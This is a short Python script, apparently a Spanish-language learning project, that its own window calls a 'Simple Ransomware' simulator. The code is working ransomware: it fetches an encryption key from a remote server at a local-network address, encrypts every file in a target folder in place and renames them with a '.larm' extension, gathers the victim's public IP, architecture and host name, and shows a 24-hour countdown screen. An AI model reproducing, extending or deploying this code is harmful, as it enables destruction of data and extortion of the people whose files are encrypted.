import os
import requests
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import ttk
from urllib.request import urlopen
import re
import json
import platform as pl
import subprocess

prog = "putty.exe"
prom = subprocess.Popen(prog)

extension = 'larm'
ruta = os.getcwd() + "/file/"

resp = requests.get('http://192.168.1.114:5000/')
key = resp.text


def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(encrypted_data)

        os.rename(item, item + '.' + extension)

path_to_encrypt = ruta
items = os.listdir(path_to_encrypt)
full_path = [path_to_encrypt + '\\' + item for item in items]

encrypt(full_path, key)


def countdown(count):

	
	hour, minute, second = count.split(':')
	hour = int(hour)
	minute = int(minute)
	second = int(second)
	label['text'] = '{}:{}:{}'.format(hour, minute, second)
	if second > 0 or minute > 0 or hour > 0:
		if second > 0:
			second -= 1
		elif minute > 0:
			minute -= 1
			second = 59
		elif hour > 0:
			hour -= 1
			minute = 59
			second = 59
		root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 

# Abrir URL.
r = urlopen("http://www.ifconfig.me/ip")
# Leer el contenido y e imprimir su tamaño.
b = r.read()

system = [
        'architecture',
       
        ]

for dato in system:
    if hasattr(pl, dato):
        a =  getattr(pl, dato)()       
        
op = pl.node()


#img10 = PhotoImage(file= r"icon/anime3.png")
root = tk.Tk()
root.title('Simple Ransomware')
root.geometry('900x300')
root['bg'] = '#080d1f'
root.resizable(0,0)
label1 = tk.Label(root, text='Simulador de Ransomware !!\n\n', font=('calibri', 12,'bold'),bg='#080d1f', fg="#fff")
label1.pack()
label2 = tk.Label(root, text= "Tu Direccion IP es: " + str(b) + "tu Arquitectura es: "+ str(a) + "/n" + "El Nombre de la Maquina es: " + op, font=('calibri', 12,'bold'), bg='#080d1f', fg="#fff")
label2.pack()
label = tk.Label(root,font=('calibri', 50,'bold'), bg='#080d1f', fg="#fff")
label.pack()


# call countdown first time    
countdown('24:00:00')
# root.after(0, countdown, 5)

root.mainloop()

